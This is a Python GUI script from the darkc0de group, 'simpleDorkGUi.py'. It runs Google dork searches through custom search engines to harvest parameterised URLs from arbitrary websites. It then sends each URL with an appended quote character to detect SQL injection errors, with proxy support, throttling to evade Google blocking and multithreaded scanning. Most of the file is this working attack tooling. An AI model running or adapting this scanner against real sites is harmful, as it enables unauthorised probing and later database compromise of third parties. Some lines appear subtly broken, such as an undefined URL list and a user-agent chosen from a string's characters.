#!/usr/bin/python
# 
# www.darkc0de.com
# this script is protected by the GPL 
# get your copy here >> http://www.gnu.org/licenses/gpl-3.0.txt
# this c0de belongs to darkc0de !!
# main code low1z & rsauron


from Tkinter import *
from tkFileDialog import *
import random, cookielib, urllib, urllib2, re, sys, socket, time, threading, string, shutil, os, httplib
from random import choice

def SetSysParms(dF, dFS, wRW, wRH, tWS, bgC, fgC):
	global dynFont, dynFontSize, windowResW, windowResH, textWindowSize, bgCol, fgCol
	dynFont = dF
	dynFontSize = dFS
	windowResW = wRW
	windowResH = wRH
        textWindowSize = tWS
	bgCol = bgC
	fgCol = fgC

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
	SetSysParms('Courier', 8, '800', '445', 36, 'black', 'lightblue')
elif sys.platform == 'darwin':
	SetSysParms('Courier', 8, '700', '440', 49, 'black', 'orange')
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SetSysParms('Courier', 8, '910', '480', 30, 'black', 'lightblue')
else:
	SetSysParms('Courier', 8, '800', '440', 36, 'black', 'orange')

timeout = 4 
socket.setdefaulttimeout(timeout)
ProxyUse = False
proxy = ''
iC = False
statList = []
gcount = 0
gthread = []
threads = []
numthreads = 8
rSA = [2,3,4,5]
GoogleURLS = []
ParmURLS = []
tmplist = []
vulnsCount = 0
version = '0.2d'

allTLDs = ('ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw')

SQLeD = {'MySQL': 'error in your SQL syntax',
         'MiscError': 'mysql_fetch',
         'MiscError2': 'num_rows',
         'Oracle': 'ORA-01756',
         'JDBC_CFM': 'Error Executing Database Query',
         'JDBC_CFM2': 'SQLServer JDBC Driver',
         'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
         'MSSQL_Uqm': 'Unclosed quotation mark',
         'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
         'MS-Access_JETdb': 'Microsoft JET Database'}

CXdic = {'blackle': '013269018370076798483:gg7jrrhpsy4',
         'ssearch': '008548304570556886379:0vtwavbfaqe',
         'redfront': '017478300291956931546:v0vo-1jh2y4',
         'bitcomet': '003763893858882295225:hz92q2xruzy',
         'daPirats': '002877699081652281083:klnfl5og4kg',
         'darkc0de': '009758108896363993364:wnzqtk1afdo',
         'googuuul': '014345598409501589908:mplknj4r1bu'}

dorkParts = ('allinanchor:', 'allintext:', 'allintitle:', 'allinurl:', 'cache:', 'define:', 'filetype:',
             'id:', 'inanchor:', 'info:', 'intext:', 'intitle:', 'inurl:', 'phonebook:', 'related:')

def gHarv(dork,site,dP,cxe,output,gnum,maxcount):
	global GoogleURLS, tmplist
        counter = 0;global gcount;gcount+=1;GoogleURLS = []
        try:
                CXr = CXdic[cxe]
                header = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)'
                saveCount = len(GoogleURLS);cmpslptime = 0;lastlen = 0
                while counter < int(maxcount):
                        jar = cookielib.FileCookieJar("cookies")
                        query = dP+dork+'+site:'+site
			gnum = int(gnum)
                        results_web = 'http://www.google.com/cse?cx='+CXr+'&q='+query+'&num='+repr(gnum)+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N'
                        request_web = urllib2.Request(results_web);agent = random.choice(header)
                        request_web.add_header('User-Agent', agent);opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
                        text = opener_web.open(request_web).read();strreg = re.compile('(?<=href=")(.*?)(?=")')
                        names = strreg.findall(text)
                        for name in names:
                                if name not in GoogleURLS:
                                        if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
                                                pass
                                        elif re.search("google", name) or re.search("youtube", name) or re.search(".gov", name) or re.search("blackle", name):
                                                pass
                                        else:
						if output == 1:
	                                                txtField.insert(END,name+'\n')
						else:
							pass
                                                GoogleURLS.append(name)
                        sleeptimer = random.choice(rSA);time.sleep(sleeptimer)
                        cmpslptime += sleeptimer;counter += int(gnum)
                        percent = int((1.0*counter/int(maxcount))*100)
                        laststatstring = 'Current MaxCount : '+repr(counter)+' | Last Query Sleeptimer ('+repr(sleeptimer)+') | Percent Done : '+repr(percent)
                        statList.append(laststatstring)                 
                        modStatus()		
		TestHost_bttn.configure(state=NORMAL,fg=fgCol)
                if iC == True:
                        for entry in GoogleURLS:
                                global tmplist
                                if '=' in entry: tmplist.append(entry)
                else:
                        pass
		for url in GoogleURLS:
			try:
				part = url.split('?')
				var = part[1].split('&')
				cod = ""
				for x in var:
					strX = x.split("=")
					cod += strX[0]
					parmURL = part[0]+cod
					if parmURL not in ParmURLS_List and url not in tmplist:
						ParmURLS_List.append(parmURL)
						tmplist.append(url)
			except:
				pass
		tmplist.sort()
		txtField.insert(END,'\nFound URLS: '+repr(len(GoogleURLS))+'\t\tTotal Parm-dupe Checked URLS: '+repr(len(tmplist)))
		txtField.insert(END,'\nGoogle Search Finished...\n')
        except IOError:
                pass

class gThread(threading.Thread):
        def __init__(self, wE, tl1, tl2, cxe,output, gnum, maxcount):
                self.parm_wE=wE;self.parm_tl1=tl1
                self.parm_tl2=tl2;self.parm_cxe=cxe
                self.fcount=0;self.outp=output
		self.status=1;self.gnum=gnum
		self.maxcount = maxcount
                threading.Thread.__init__(self)

        def run (self):
                try:
                        lowerStatusL.delete('0.0',END)
                        txtField.delete('0.0',END)
                        gHarv(self.parm_wE,self.parm_tl1,self.parm_tl2,self.parm_cxe,self.outp, self.gnum, self.maxcount)
			self.status = 0
                except(KeyboardInterrupt,ValueError):
                        pass
                self.fcount+=1

def cINJStatus(tmplist, threads):
	global vulnsCount;lowerStatusL.delete('0.0',END)
	FinishURLSCount = 0;lowerStatusL.tag_config('a', justify='center')
	while tmplist != FinishURLSCount:
		FinishURLSCount = 0;time.sleep(1)
		for thread in threads:
			FinishURLSCount+=thread.fcount
		percent = int((1.0*FinishURLSCount/tmplist)*100)
		lowerStatusL.delete('0.0',END)
		laststatstring = 'URLS to be Tested : '+repr(tmplist)+' | Urls Tested : '+repr(FinishURLSCount)+' | Vulns Found : '+repr(vulnsCount)+' | Percent Complete : '+repr(percent)+'%'
		lowerStatusL.insert(END,laststatstring,'a')
	txtField.insert(END,'\nFinished Classic detection...')

class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                ClassicINJ(url)
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

def ClassicINJ(url):
        EXT = "'"
	if ProxyUse == True:
	        host = url+EXT
	        try:
			print "PROXY_YES :", host
	                pxhandle = urllib2.ProxyHandler({"http": proxy})
	                opener = urllib2.build_opener(pxhandle)
	                urllib2.install_opener(opener)
	                source = urllib2.urlopen(host).read()
	                for type,eMSG in SQLeD.items():
	                        if re.search(eMSG, source):
	                                txtField.insert(END,'V. Found: '+host+' Error Type: '+type+'\n')
	                        else:
	                                pass
	        except(KeyboardInterrupt):
	                sys.exit(0)
	        except:
	                pass
	else:
	        host = url+EXT
	        try:
	                source = urllib2.urlopen(host).read()
	                for type,eMSG in SQLeD.items():
	                        if re.search(eMSG, source):
	                                txtField.insert(END,'V. Found: '+host+' Error Type: '+type+'\n')
	                        else:
	                                pass
	        except(KeyboardInterrupt):
	                sys.exit(0)
	        except:
	                pass

def Proxy():
	global pxyEntry, ProxyCheckStatus, pLevel
        pLevel = Toplevel();pLevel.geometry('200x90+100+100')
        ProxyFrame = Frame(pLevel)
        nLL = Label(pLevel, text='Proxy Setup')
	ProxyLabel = Label(ProxyFrame, text='Proxy:', bd=1, anchor=N, font=(dynFont, dynFontSize, 'bold'));ProxyLabel.pack(side=LEFT)
	pxyEntry = Entry(ProxyFrame, text='Proxy',fg=bgCol, bg=fgCol, font=(dynFont, dynFontSize, ''), width=20);pxyEntry.pack(side=LEFT)
        ProxyFrame.pack(anchor=CENTER,ipady=10, side=TOP)
        ProxyFrame2 = Frame(pLevel)
	psave_bttn = Button(ProxyFrame2,text='Save', command=proxySave, width=5, font=(dynFont, dynFontSize, 'bold'));psave_bttn.pack(side=LEFT)
	pcheck_bttn = Button(ProxyFrame2,text='Check', command=ProxyCheck, width=5, font=(dynFont, dynFontSize, 'bold'));pcheck_bttn.pack(side=LEFT)
	pabrt_bttn = Button(ProxyFrame2,text='Abort', command=pLevel.destroy, width=5, font=(dynFont, dynFontSize, 'bold'));pabrt_bttn.pack(side=LEFT)
	ProxyFrame2.pack(anchor=CENTER,ipady=2, side=TOP)
	ProxyFrame3 = Frame(pLevel)
	ProxyCheckStatus = Text(ProxyFrame3, font=(dynFont, dynFontSize, ''),fg=fgCol, bg='black', width=23, height=0, wrap=WORD, yscrollcommand=scb.set,relief=GROOVE);ProxyCheckStatus.pack(side=BOTTOM)
	ProxyFrame3.pack(anchor=CENTER, side=TOP)
        window2 = Label(pLevel)
	if proxy != '':
		psave_bttn.configure(state=NORMAL)		

def ProxyCheck():
	global proxy, ProxyStatusCheck, psave_bttn, Pindicator
	proxy_tmp = pxyEntry.get()
	if proxy_tmp == '':
                ProxyCheckStatus.delete('0.0',END)
		ProxyCheckStatus.config(fg='black', bg='red')
		ProxyCheckStatus.insert(END,'No Proxy Supplied')
		Pindicator.config(bg='red')
		proxy = proxy_tmp
	else:
		try:
	                ProxyCheckStatus.delete('0.0',END)
			ProxyCheckStatus.config(fg='black', bg='yellow')
			ProxyCheckStatus.insert(END,'Checking Proxy')
	                proxyTest = httplib.HTTPConnection(proxy_tmp)
	                proxyTest.connect()
			proxy = proxy_tmp
	                ProxyCheckStatus.delete('0.0',END)
			ProxyCheckStatus.insert(END,'Proxy Valid')
			ProxyCheckStatus.config(fg='black', bg='green')
			Pindicator.config(bg='green')
		except(socket.timeout):
	                ProxyCheckStatus.delete('0.0',END)
			ProxyCheckStatus.config(fg='black', bg='red')
			ProxyCheckStatus.insert(END,'Proxy Timeout')
			proxy = ''
			Pindicator.config(bg='red')
		except(NameError):
	                ProxyCheckStatus.delete('0.0',END)
			ProxyCheckStatus.config(fg='black', bg='red')
			ProxyCheckStatus.insert(END,'Proxy not Given')
			proxy = ''
			Pindicator.config(bg='red')
		except:
	                ProxyCheckStatus.delete('0.0',END)
			ProxyCheckStatus.config(fg='black', bg='red')
			ProxyCheckStatus.insert(END,'Proxy Failed')
			proxy = ''
			Pindicator.config(bg='red')

def proxySave():
	global ProxyUse, pxyEntry
	if proxy == '':
		ProxyUse = False
	else:
		ProxyUse = True
	print "Current Proxy :", proxy, "ProxyUse :", ProxyUse
	pLevel.destroy()

def modStatus():
        x = len(statList)
        lowerStatusL.delete('0.0',END)
	lowerStatusL.tag_config('a', justify='center')
        lowerStatusL.insert(END,statList[x-1], 'a')
	if statList[x-1].endswith('100') or statList[x-1].endswith('120'):
		finalcount = ' | Total URLs :'+repr(len(GoogleURLS))
		button_R.configure(state=NORMAL)
	        lowerStatusL.insert(END,finalcount)

def TestHost():
        txtField.delete('0.0',END); tmp = []
	hostcount = repr(len(tmplist)) 
	txtField.insert(END,'checking : ');txtField.insert(END,hostcount);txtField.insert(END,' Hosts for vulns...\n')
	print "testing", len(tmplist), "hosts"
        if len(tmplist) == 0 or len(tmplist) < 2:
		pass
	else:
                tmplist.sort()
                i = len(tmplist) / int(numthreads)
                m = len(tmplist) % int(numthreads)
                z = 0
                if len(threads) <= numthreads:
                        for x in range(0, int(numthreads)):
                                sliced = tmplist[x*i:(x+1)*i]
                                if (z < m):
                                        sliced.append(tmplist[int(numthreads)*i+z])
                                        z += 1
                                thread = injThread(sliced)
                                thread.start()
                                threads.append(thread)
                else:
                        pass

def output():
        txtField.delete('0.0',END); tmp = []
	button_R.configure(state=DISABLED)
        gthread = gThread(wEntry.get(),tldSB.get(),chkGSO.get(),chkCXE.get(),1, chkGn.get(), chkMc.get())
	gthread.start()

def output_clear():
        for entry in GoogleURLS:
                GoogleURLS.pop()
        txtField.delete('0.0',END)
	intro()
        lowerStatusL.delete('0.0',END)
	TestHost_bttn.configure(state=DISABLED)
	button_R.configure(state=NORMAL)

def intro():
	txtField.insert(END,'''\n\n\n\n\t\t\t\t\t\t\tdarkc0de.com Presents..\n'''
			    '''\n\t\t\t\t\t    _            _     ___          _    ___ _   _ _\n'''
			    '''\t\t\t\t\t __(_)_ __  _ __| |___|   \ ___ _ _| |__/ __| | | (_)\n'''
			    '''\t\t\t\t\t(_-< | '  \| '_ \ / -_) |) / _ \ '_| / / (_ | |_| | |\n'''
			    '''\t\t\t\t\t/__/_|_|_|_| .__/_\___|___/\___/_| |_\_\\____|\___/|_|\n'''
			    '''\t\t\t\t\t           |_| \n\t\t\t\t\t\t\t\t\t\t version:'''+version+'''\n\n'''
			    '''\t\t\t\t\t\t\t\tAn low1z & rsauron Production''')

def help():
        nLevel = Toplevel()
        nLevel.geometry('540x480+100+100')
	helpFrame = Frame(nLevel)
	txtSB = Scrollbar(helpFrame)
	nLL = Label(nLevel, text='simpleDorkGUi.py Help')
	nLtxt = Text(helpFrame, font=(dynFont, dynFontSize, ''),fg=fgCol, bg=bgCol, width=540, height=48, wrap=WORD)
	txtSB.config(command=nLtxt.yview)
	txtSB.pack(side=RIGHT, fill=Y)
	nLtxt.pack(fill=Y)
	helpFrame.pack(side=RIGHT, fill=Y)


	helptxt = '''simpleDorkGUi.py - Help\n\n
CXE         - Custom Search Engine Used for Queries
		| blackle, darkc0de, singlesearch, bitcomet, 
		| dapirates, googuul, redfront\n
GSO         - Google Search Optimization Parameters are:
		|
		| allinanchor:,allintext:,allintitle:,allinurl:,cache:
		| define:,filetype:,id:,inanchor:,info:,intext:,intitle:
		| inurl:,phonebook:,related:\n
Query       - your actual query
TLD         - TopLevel Domain to search in. \n\t\t      you can also put domain names + tld in here\n
injGet - Collects only url's containing a '='
TestHost      - checks all injGet urls\n
RUN         - Start to Query
Clear       - Remove last url's from screen\n
resultsPP   - Results given by Google in 1 Query
maxcount    - Complete Query Count \n\t      (500 / resultsPP100 makes 5 Queries)\n
this script tools has functions to prevent google given 403's however i was
not able to implement a function against human stupidy which means hitting 
the google button several times *may* lead to a 403. just watch the statusbar 
and wait till its 100%\n
this tool is a darkc0de community tool, it comes of course with no warrant of 
function and we cant take responseabilities for eventual damages caused by this
tools.

if you like this tool, found a bug or just looking for place to learn
some scripting yourself visit: http://forum.darkc0de.com
'''
	nLtxt.insert(END, helptxt)
	nLtxt.tag_add('helpTitle', '1.0','1.30')
	nLtxt.tag_configure('helpTitle', font=(dynFont, dynFontSize+6, 'bold','underline'))
	nLtxt.tag_add('darkc0de', '38.31','38.56')
	nLtxt.tag_configure('darkc0de', font=(dynFont, dynFontSize+1, 'bold'))
        window2 = Label(nLevel)
        
def FileOpen():
	global tmplist
	tmplist = []
        initdir = '/'
        mask = [('Text','*.txt'),('All', '*.*')]
        try:
                lst = askopenfile(initialdir=initdir, filetypes=mask, mode='r')
                loadedlist = lst.readlines()
                if loadedlist != None:
                        txtField.delete('0.0',END)
                        for entry in loadedlist:
                                txtField.insert(END,entry)
				tmplist.append(entry[:-1])
			TestHost_bttn.configure(state=NORMAL,fg=fgCol)
        except(IOError,AttributeError):
                pass

def FileSave():
	try:
                locallst = asksaveasfile(mode='w', defaultextension='.txt')
		global GoogleURLS, tmplist
		print len(GoogleURLS),len(tmplist)
                if len(GoogleURLS) != 0 or len(tmplist) != 0:
                        if len(tmplist) == 0:
                                for entry in GoogleURLS:
                                        locallst.write(entry+'\n')
                        else:
                                for entry in tmplist:
                                        locallst.write(entry+'\n')
			locallst.close()
                else:
                        txtField.insert(END,'\n\n\n\n\t\t\t\t\tMaybe you should supply something for saving...')
        except(IOError,AttributeError):
                pass

def setVars():
        global iC
        if statusparm.get() == 'On':
                iC = True
        else:
                iC = False

CXstr = ()
for cx,strX in CXdic.items(): CXstr += (cx,)
window = Tk()
window.geometry(windowResW+'x'+windowResH)
myFrame = Frame(window)
scb = Scrollbar(myFrame)
scb.pack(side=RIGHT, fill=Y)
txtField = Text(myFrame, font=(dynFont, dynFontSize, ''),fg=fgCol, bg=bgCol, width=400, height=textWindowSize, wrap=WORD, yscrollcommand=scb.set);txtField.pack(expand=1, fill=BOTH)
scb.config(command=txtField.yview)
myFrame.pack(expand=1, fill=BOTH)
window.title('simpleDorkGUi.py   |   low1z   |   rsauron   |   forum.darkc0de.com')
MNU = Menu(master=window, font=(dynFont, dynFontSize, ''), relief=FLAT)
window.config(menu=MNU)
m1 = Menu(master=MNU, tearoff=0)
MNU.add_cascade(label='File', menu=m1)
m1.add_command(label='Save', command=FileSave, font=(dynFont, dynFontSize, ''))
m1.add_command(label='Load', command=FileOpen, font=(dynFont, dynFontSize, ''))
m1.add_command(label='Help', command=help, font=(dynFont, dynFontSize, ''))
m1.add_command(label='Proxy', command=Proxy, font=(dynFont, dynFontSize, ''))
m1.add_command(label='Exit', command=window.destroy, font=(dynFont, dynFontSize, ''));mainFrame = Frame(window)
chkCXE = StringVar(mainFrame)
chkCXE.set(CXstr[0])
optMenuCXE = OptionMenu(mainFrame, chkCXE, *CXstr)
optMenuCXE.config(font=(dynFont, dynFontSize, ''), width=7)
optMenuCXE.pack(side=LEFT, fill=X)
chkGSO = StringVar(mainFrame)
chkGSO.set(dorkParts[0])
optMenuGSO = OptionMenu(mainFrame, chkGSO, *dorkParts)
optMenuGSO.config(font=(dynFont, dynFontSize, ''), width=10)
optMenuGSO.pack(side=LEFT, fill=X)
status = Label(mainFrame, text='Query:', bd=1, anchor=W, font=(dynFont, dynFontSize, ''));status.pack(side=LEFT, fill=X)
wEntry = Entry(mainFrame, text='entry?',fg=bgCol, bg=fgCol, font=(dynFont, dynFontSize, ''), width=30);wEntry.pack(side=LEFT)
status = Label(mainFrame, text='TLD:', bd=1, anchor=W, font=(dynFont, dynFontSize, ''));status.pack(side=LEFT, fill=X)
tldSB = Spinbox(mainFrame, values=allTLDs,fg=fgCol, bg=bgCol, width=8, font=(dynFont, dynFontSize, ''));tldSB.pack(side=LEFT)
button_R = Button(mainFrame,text='RUN', command=output, width=5, font=(dynFont, dynFontSize, ''));button_R.pack(side=LEFT)
button_C = Button(mainFrame,text='clear', command=output_clear, width=5, font=(dynFont, dynFontSize, ''));button_C.pack(side=LEFT)
TestHost_bttn = Button(mainFrame,text='TestHost', command=TestHost, width=8, font=(dynFont, dynFontSize, 'bold'));TestHost_bttn.pack(side=LEFT)
iCl = Label(mainFrame, text='injGet:', font=(dynFont, dynFontSize, ''));iCl.pack(side=LEFT)
statusparm = StringVar(mainFrame)
chkBtn = Checkbutton(mainFrame, indicatoron=1, onvalue='On', offvalue='Off', variable=statusparm, command=setVars, textvariable=statusparm, width=3, selectcolor=fgCol, font=(dynFont, dynFontSize, ''))
chkBtn.pack(side=LEFT)
chkBtn.deselect()
mainFrame.pack(anchor=W)
TestHost_bttn.configure(state=DISABLED)
myFramelow = Frame(window)
lowerStatusL = Text(myFramelow, font=(dynFont, dynFontSize, ''),fg=fgCol, bg=bgCol, width=93, height=0, wrap=WORD, yscrollcommand=scb.set,relief=GROOVE);lowerStatusL.pack(side=LEFT)
rpF=Frame(myFramelow)
status = Label(rpF, text='PR:', bd=1, anchor=W, font=(dynFont, dynFontSize, ''));status.pack(side=LEFT, fill=X)
gnumList = ['10','20','30','50','100']
chkGn = StringVar(rpF)
chkGn.set(gnumList[0])
optMenuGn = OptionMenu(rpF, chkGn, *gnumList)
optMenuGn.config(font=(dynFont, dynFontSize, ''), width=3)
optMenuGn.pack()
rpF.pack(side=LEFT)
mcF = Frame(myFramelow)
status = Label(mcF, text='MAX:', bd=1, anchor=W, font=(dynFont, dynFontSize, ''));status.pack(side=LEFT, fill=X)
maxcList = ['100','200','300','400','500','600','700','800','900','1000']
chkMc = StringVar(mcF)
chkMc.set(maxcList[0])
optMenuMc = OptionMenu(mcF, chkMc, *maxcList)
optMenuMc.config(font=(dynFont, dynFontSize, ''), width=3)
optMenuMc.pack()
mcF.pack(side=LEFT)
pF = Frame(myFramelow)
Pstatus = Label(pF, text='proxy:', bd=1, anchor=W, font=(dynFont, dynFontSize, ''));Pstatus.pack(side=LEFT, fill=X)
Pindicator = Text(pF, font=(dynFont, 5, ''), bg='red', width=2, height=1,relief=GROOVE);Pindicator.pack(side=LEFT)
pF.pack(side=LEFT)
myFramelow.pack(anchor=W, side=BOTTOM)
intro()
window.mainloop()
